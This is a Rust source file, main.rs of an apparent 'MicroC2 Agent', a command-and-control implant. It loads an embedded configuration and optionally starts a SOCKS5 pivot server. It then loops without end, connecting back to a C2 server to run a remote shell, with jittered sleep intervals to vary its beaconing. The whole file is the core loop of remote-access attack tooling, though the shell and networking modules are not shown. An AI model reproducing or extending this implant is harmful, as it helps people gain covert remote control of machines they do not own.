mod commands;
mod config;
mod networking;

use commands::command_shell::run_shell;
use config::AgentConfig;
use std::env;
use std::time::Duration;
use tokio::time;
use rand::Rng;
use log::{info, warn};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    println!("[STARTUP] MicroC2 Agent starting...");
    
    let config = AgentConfig::load()?;
    info!("[CONFIG] Loaded agent config: {:?}", config);

    if config.socks5_enabled {
        info!("[CONFIG] SOCKS5 is enabled. Proxy: 127.0.0.1:{}, all C2 traffic will use SOCKS5 Reverse Proxy tunnel.", config.socks5_port);
        // Start SOCKS5 server for pivoting
        let socks5_port = config.socks5_port;
        tokio::spawn(async move {
            if let Err(e) = crate::networking::fast_socks5_pivot::start_socks5_server("127.0.0.1", socks5_port).await {
                log::error!("[SOCKS5] Server failed: {:?}", e);
            }
        });
    } else {
        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
    }

    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);
    println!("[INFO] Using embedded configuration");

    loop {
        println!("[NETWORK] Attempting connection to C2: {}", server_addr);
        if let Err(e) = run_shell(&server_addr, &agent_id).await {
            println!("[ERROR] Shell error: {}. Retrying...", e);
            // Add small delay after error before retrying
            time::sleep(Duration::from_secs(5)).await;
        }
        
        let mut rng = rand::thread_rng();
        let sleep_time = config.sleep_interval + rng.gen_range(0..config.jitter);
        time::sleep(Duration::from_secs(sleep_time)).await;
    }
}
